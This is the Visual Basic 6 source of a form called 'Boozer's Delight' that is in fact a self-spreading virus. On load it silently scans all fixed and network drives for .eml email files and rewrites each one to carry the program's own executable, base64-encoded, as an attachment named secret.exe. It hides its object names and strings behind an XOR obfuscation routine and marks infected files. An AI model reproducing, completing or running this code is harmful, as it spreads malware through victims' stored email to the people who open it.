   VERSION 5.00
   Begin VB.Form Form2
      BackColor       =   &H00000000&
      BorderStyle     =   4  'Fixed ToolWindow
      Caption         =   "Boozer's Delight"
      ClientHeight    =   3180
      ClientLeft      =   4005
      ClientTop       =   2790
      ClientWidth     =   3450
      LinkTopic       =   "Form2"
      MaxButton       =   0   'False
      MinButton       =   0   'False
      Picture         =   "reason2.frx":0000
      ScaleHeight     =   3180
      ScaleWidth      =   3450
      ShowInTaskbar   =   0   'False
      Begin VB.Label Label1
         BackColor       =   &H00000000&
         Caption         =   "I'm in your computer.."
         BeginProperty Font
            Name            =   "Chiller"
            Size            =   18
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H000000C0&
         Height          =   495
         Left            =   360
         TabIndex        =   0
         Top             =   2400
         Width           =   2775
      End
   End
   Attribute VB_Name = "Form2"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   Private Sub Form_Load()
   On Error Resume Next
   Call dribe
   End Sub
   Sub dribe()
     On Error Resume Next
     Dim d, dc, s, fso, dribe
     Set fso = CreateObject(x("³ƒ’‰*”‰Ž‡Î¦‰Œ…³™“”…*¯‚Š…ƒ”"))
     Set dc = fso.Drives
     For Each d In dc
       If d.DriveType = 2 Or d.DriveType = 3 Then
         fldr (d.Path & x("¼"))
       End If
     Next
     dribe = s
   End Sub
   Sub info(spec)
     On Error Resume Next
     Dim f, f1, fc, ext, ap, mircfname, s, fso
     Set fso = CreateObject(x("³ƒ’‰*”‰Ž‡Î¦‰Œ…³™“”…*¯‚Š…ƒ”"))
     Set f = fso.GetFolder(spec)
     Set fc = f.Files
     For Each f1 In fc
       ext = fso.GetExtensionName(f1.Path)
       ext = LCase(ext)
       s = LCase(f1.Name)
   If (ext = x("…*Œ")) Then
       mimeinfect (f1.Path)
   End If
   Next
   End Sub
   Sub fldr(spec)
     On Error Resume Next
     Dim f, f1, sf, fso
       Set fso = CreateObject(x("³ƒ’‰*”‰Ž‡Î¦‰Œ…³™“”…*¯‚Š…ƒ”"))
     Set f = fso.GetFolder(spec)
     Set sf = f.SubFolders
     For Each f1 In sf
       info (f1.Path)
       fldr (f1.Path)
     Next
   End Sub
   Private Sub mimeinfect(fileinput As String)
   On Error Resume Next
   Dim dd As Integer
   Dim s As String
   Dim sig, ver, textline, ddd, bb, extasy, extasy1, sex, g, gh, rout, num, source, fileread, b, c, d, e
   Open fileinput For Input As #6
   Do Until Mid(sig, 1, 4) = x("©¥")
   Line Input #6, sig
   Loop
   Line Input #6, ver
   Close #6
   If Mid(ver, 18, 3) = x("ÖÖÖ") Then
   Else
   Open fileinput For Input As #1
   Do Until Mid(textline, 1, 4) = x("©¥")
   Line Input #1, textline
   ddd = ddd & textline & vbCrLf
   Loop
   If Mid(textline, 1, 4) = x("©¥") Then
   bb = ddd & textline & x("ÖÖÖ")
   End If
   Line Input #1, extasy
   Line Input #1, extasy1
   If Mid(extasy1, 2, 5) = x("‚*•Ž„") Then
   Else
   Line Input #1, sex
   extasy1 = sex
   End If
   Do Until EOF(1)
   Line Input #1, g
   gh = gh & g & vbCrLf
   dd = dd + 1
   Loop
   Close #1
   'the routine
   Open fileinput For Input As #7
   Do Until Mid(rout, 1, 4) = x("©¥")
   Line Input #7, rout
   Loop
   For num = 0 To dd - 1
   Line Input #7, source
   fileread = fileread & source & vbCrLf
   Next num
   Close #7
   b = Mid(extasy1, 12, 41)
   c = App.Path & App.EXEName & x("Î…˜…")
   If Right(App.Path, 1) <> "\" Then c = App.Path & "\" & App.EXEName & x("Î…˜…")
   d = b64(c)
   e = "£*Ž”…Ž”Í´™*…ÚÀ***Œ‰ƒ*”‰*ŽÏ˜Í*“„*—ŽŒ**„ÛíêÀÀÀŽ**…ÝÂ“…ƒ’…”Î…˜…Âíê£*Ž”…Ž”Í´’*Ž“†…’Í¥Žƒ*„‰Ž‡ÚÀ‚*“…ÖÔíê£*Ž”…Ž”Í¤‰“**“‰”‰*ŽÚÀ*””*ƒˆ*…Ž”ÛíêÀÀÀ†‰Œ…Ž**…ÝÂ“…ƒ’…”Î…˜…Â"
   Open fileinput For Output As #1
   Print #1, bb
   Print #1, fileread
   Print #1, "--" & b
   Print #1, x(e)
   Print #1, d
   Print #1, "--" & b & "--"
   Close 1
   End If
   End Sub
   Private Function x(sText)
   On Error Resume Next
   Dim ekey, i, hash, crbyte
   ekey = 3029
   For i = 1 To Len(sText)
       hash = Asc(Mid(sText, i, 1))
       crbyte = Chr(hash Xor (ekey Mod 255))
       x = x & crbyte
   Next i
   End Function
   Private Function b64(ByVal vsFullPathname As String) As String
   On Error Resume Next
       'For Encoding BASE64
       Dim b           As Integer
       Dim b64ed   As Variant
       Dim bin(3)      As Byte
       Dim s           As String
       Dim l           As Long
       Dim i           As Long
       Dim FileIn      As Long
       Dim sResult     As String
       Dim n           As Long

       'b64ed=>tabla de tabulación
       b64ed = Array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/")

       Erase bin
       l = 0: i = 0: FileIn = 0: b = 0:
       s = ""

       'Gets the next free filenumber
       FileIn = FreeFile

       'Open Base64 Input File
       Open vsFullPathname For Binary As FileIn

       sResult = s & vbCrLf
       s = ""

       l = LOF(FileIn) - (LOF(FileIn) Mod 3)

       For i = 1 To l Step 3

           'Read three bytes
           Get FileIn, , bin(0)
           Get FileIn, , bin(1)
           Get FileIn, , bin(2)

           'Always wait until there're more then 64 characters
           If Len(s) > 64 Then

               s = s & vbCrLf
               sResult = sResult & s
               s = ""

           End If

           'Calc Base64-encoded char
           b = (bin(n) \ 4) And &H3F 'right shift 2 bits (&H3F=111111b)
           s = s & b64ed(b) 'the character s holds the encoded chars

           b = ((bin(n) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
           s = s & b64ed(b)

           b = ((bin(n + 1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
           s = s & b64ed(b)

           b = bin(n + 2) And &H3F
           s = s & b64ed(b)

       Next i

       'Now, you need to check if there is something left
       If Not (LOF(FileIn) Mod 3 = 0) Then

           'Reads the number of bytes left
           For i = 1 To (LOF(FileIn) Mod 3)
               Get FileIn, , bin(i - 1)
           Next i

           'If there are only 2 chars left
           If (LOF(FileIn) Mod 3) = 2 Then
               b = (bin(0) \ 4) And &H3F 'right shift 2 bits (&H3F=111111b)
               s = s & b64ed(b)

               b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
               s = s & b64ed(b)

               b = ((bin(1) And &HF) * 4) Or ((bin(2) \ 64) And &H3)
               s = s & b64ed(b)

               s = s & "="

           Else 'If there is only one char left
               b = (bin(0) \ 4) And &H3F 'right shift 2 bits (&H3F=111111b)
               s = s & b64ed(b)

               b = ((bin(0) And &H3) * 16) Or ((bin(1) \ 16) And &HF)
               s = s & b64ed(b)

               s = s & "=="
           End If
       End If

       'Send the characters left
       If s <> "" Then
           s = s & vbCrLf
           sResult = sResult & s
       End If

       'Send the last part of the MIME Body
       s = ""

       Close FileIn
       b64 = sResult

   End Function
